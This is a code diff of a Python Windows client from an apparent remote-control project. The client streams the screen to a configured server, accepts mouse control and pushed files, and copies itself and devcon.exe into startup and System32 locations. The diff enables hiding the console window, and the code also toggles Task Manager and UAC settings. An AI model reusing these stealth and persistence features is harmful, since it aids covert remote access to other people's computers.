@@ -34,28 +34,19 @@ try:
 except:
     import http.client as httplib
 
-# Hide the Console
-# window = win32console.GetConsoleWindow()
-# win32gui.ShowWindow(window, 0)
-
 from ctypes import windll
 SetWindowPos = windll.user32.SetWindowPos
-
 NOSIZE = 1
 NOMOVE = 2
 TOPMOST = -1
 NOT_TOPMOST = -2
 
-prog_call = r'%s' % str(Path(__file__).absolute()).replace('\\', '/')
+# prog_call = r'%s' % str(Path(__file__).absolute()).replace('\\', '/')
+# prog_location = os.path.split(prog_call)[0]
+prog_call = sys.argv[0]
 prog_location = os.path.split(prog_call)[0]
 WOL_SETTINGS_FILE = "Enable-WOLWindowsNICSettings.ps1"
-BROADCAST_IP = '<broadcast>'
 MAC_ADDRESS = gma().replace(":", "")
-SERVER_PORT = 9007
-SECONDARY_PORT = 9562
-THIRD_PORT = 15670
-TCP_PORT = 9001
-TCP_PORT2 = 9005
 BUFFER_SIZE = 1024
 MAX_BYTES = 65000
 
@@ -75,6 +66,35 @@ print(application_path)
 config_path = os.path.join(application_path, config_name)
 print(config_path)"""
 
+# Hide the Console
+window = win32console.GetConsoleWindow()
+win32gui.ShowWindow(window, 0)
+
+
+def get_network_data(pattern):
+    try:
+        read_con = open(final.first_setup_path + "\\network_data.txt", "r")
+    except:
+        read_con = open(prog_location + "\\network_data.txt", "r")
+    content = read_con.read()
+    lines = content.split("\n")
+    for line in lines:
+        parts = line.split(",")
+        if str(parts[0]) == str(pattern):
+            read_con.close()
+            return parts[1].strip("\n")
+    read_con.close()
+
+
+class NetworkData:
+    BROADCAST_IP = '<broadcast>'
+    SERVER_IP = str(get_network_data("SERVER_IP"))
+    SERVER_PORT = int(get_network_data("SERVER_PORT"))
+    SECONDARY_PORT = int(get_network_data("SECONDARY_PORT"))
+    THIRD_PORT = int(get_network_data("THIRD_PORT"))
+    TCP_PORT = int(get_network_data("TCP_PORT"))
+    TCP_PORT2 = int(get_network_data("TCP_PORT2"))
+
 
 def add_to_startup():
     # move the files of the project to the startup folder
@@ -85,35 +105,34 @@ def add_to_startup():
         file_path_move = final.main_path + "\\client_big_project.exe"
         image_move = final.first_setup_path + "\\fe_icon.png"
         wol_settings_move = "C:\\%s" % WOL_SETTINGS_FILE
+        network_data_move = final.first_setup_path + "\\network_data.txt"
         devconCurrent = file_folder + "\\devcon.exe"
         file_path_current = file_folder + "\\client_big_project.exe"
         image_current = file_folder + "\\fe_icon.png"
         wol_setting_current = file_folder + "\\%s" % WOL_SETTINGS_FILE
-        print(devconCurrent)
-        print(file_path_current)
-        print(image_current)
+        network_data_current = file_folder + "\\network_data.txt"
         try:
-            shutil.move(image_current, image_move)
+            shutil.copy(image_current, image_move)
         except Exception as e:
             print(e)
-            pass
         try:
-            shutil.move(file_path_current, file_path_move)
+            shutil.copy(file_path_current, file_path_move)
         except Exception as e:
             print(e)
-            pass
         try:
-            shutil.move(devconCurrent, devconMove)
+            shutil.copy(devconCurrent, devconMove)
             shutil.copy(devconMove, r"C:\Windows\System32\devcon.exe")
             shutil.copy(devconMove, r"C:\Windows\SysWOW64\devcon.exe")
         except Exception as e:
             print(e)
-            pass
         try:
             shutil.copy(wol_setting_current, wol_settings_move)
         except Exception as e:
             print(e)
-            pass
+        try:
+            shutil.copy(network_data_current, network_data_move)
+        except Exception as e:
+            print(e)
     except:
         pass
 
@@ -125,7 +144,7 @@ def control_mss():
     watch_client_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
     watch_client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
     screen_size = "{},{}".format(client.WIDTH, client.HEIGHT)
-    watch_client_socket.sendto(screen_size.encode(), (final.SERVER_IP, THIRD_PORT))
+    watch_client_socket.sendto(screen_size.encode(), (NetworkData.SERVER_IP, NetworkData.THIRD_PORT))
     time.sleep(0.5)
     with mss() as sct:
         rect = {'top': 0, 'left': 0, 'width': client.WIDTH, 'height': client.HEIGHT}
@@ -137,17 +156,17 @@ def control_mss():
                     size = len(pixels)
                     size_len = (size.bit_length() + 7) // 8
                     size_bytes = size.to_bytes(size_len, 'big')
-                    watch_client_socket.sendto(size_bytes, (final.SERVER_IP, THIRD_PORT))
+                    watch_client_socket.sendto(size_bytes, (NetworkData.SERVER_IP, NetworkData.THIRD_PORT))
                     sleep = False
                     if size > 100000:
                         sleep = True
                     while client.max_bytes < len(pixels):
                         part_pixels = pixels[:client.max_bytes]
-                        watch_client_socket.sendto(part_pixels, (final.SERVER_IP, THIRD_PORT))
+                        watch_client_socket.sendto(part_pixels, (NetworkData.SERVER_IP, NetworkData.THIRD_PORT))
                         if sleep:
                             time.sleep(0.001)
                         pixels = pixels[client.max_bytes:]
-                    watch_client_socket.sendto(pixels, (final.SERVER_IP, THIRD_PORT))
+                    watch_client_socket.sendto(pixels, (NetworkData.SERVER_IP, NetworkData.THIRD_PORT))
                 else:
                     break
             except FileNotFoundError:
@@ -185,15 +204,14 @@ def show_mouse():
     mouse_client_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
     mouse_client_socket.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
     time.sleep(0.3)
-    mouse_client_socket.sendto("connected".encode(), (final.SERVER_IP, SECONDARY_PORT))
+    mouse_client_socket.sendto("connected".encode(), (NetworkData.SERVER_IP, NetworkData.SECONDARY_PORT))
     print("yes")
     while True:
         data, address = mouse_client_socket.recvfrom(MAX_BYTES)
         data = data.decode()
         if data == "stop_mouse":
             print("stop_send_screen")
-            if str(get(final.command_execute)) != "watch_stop":
-                replace(final.command_execute, "watch_stop")
+            replace(final.command_execute, "watch_stop")
             # check_q.put("stop_send")
             break
         data = data.split(",")
@@ -231,7 +249,7 @@ def waitingwindow():
 
 def get_file():
     tcp_client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    tcp_client.connect((final.SERVER_IP, TCP_PORT))
+    tcp_client.connect((NetworkData.SERVER_IP, NetworkData.TCP_PORT))
     file_path = tcp_client.recv(BUFFER_SIZE).decode()
     file_name = os.path.split(file_path)[1]
     print(file_name)
@@ -290,8 +308,8 @@ class Client(Thread):
         self.WIDTH = user32.GetSystemMetrics(0)
         self.HEIGHT = user32.GetSystemMetrics(1)
         self.max_bytes = max_bytes
-        self.server_ip = ""
-        self.port = SERVER_PORT
+        self.server_ip = NetworkData.SERVER_IP
+        self.port = NetworkData.SERVER_PORT
         self.mac = MAC_ADDRESS
         self.mouse = MouseController()
         self.client_socket = socket.socket(family=socket.AF_INET, type=socket.SOCK_DGRAM)
@@ -348,6 +366,10 @@ class Client(Thread):
         # print other computer screen
         try:
             while watching:
+                for event in pygame.event.get():
+                    if event.type == pygame.KEYDOWN:
+                        if event.key == pygame.K_ESCAPE:
+                            pass
                 alwaysOnTop(1)
                 size = int.from_bytes(self.socket_recv(self.client_socket, self.max_bytes), byteorder='big')
                 while size > 10000000:  # checks if it is a size and not part of the pixels
@@ -423,12 +445,9 @@ class Client(Thread):
         self.client_socket.settimeout(4)
         while True:
             try:
-                print("2")
-                self.client_socket.sendto("new client".encode(), (BROADCAST_IP, self.port))
-                print("5")
+                self.client_socket.sendto("new client".encode(), (self.server_ip, self.port))
+                print("first send")
                 data, address = self.client_socket.recvfrom(self.max_bytes)
-                self.server_ip = address[0]
-                final.SERVER_IP = self.server_ip
                 self.client_socket.settimeout(None)
                 break
             except:
@@ -476,12 +495,14 @@ class Client(Thread):
                 self.command_response(data)
             except:
                 pass
+            time.sleep(0.1)
 
         final.end_gui = True
         set_uac_message("1")
         set_taskmgr("0")
         send_gui_thread.join()
         self.client_socket.close()
+        os._exit(1)
 
 
 def hide_folder():
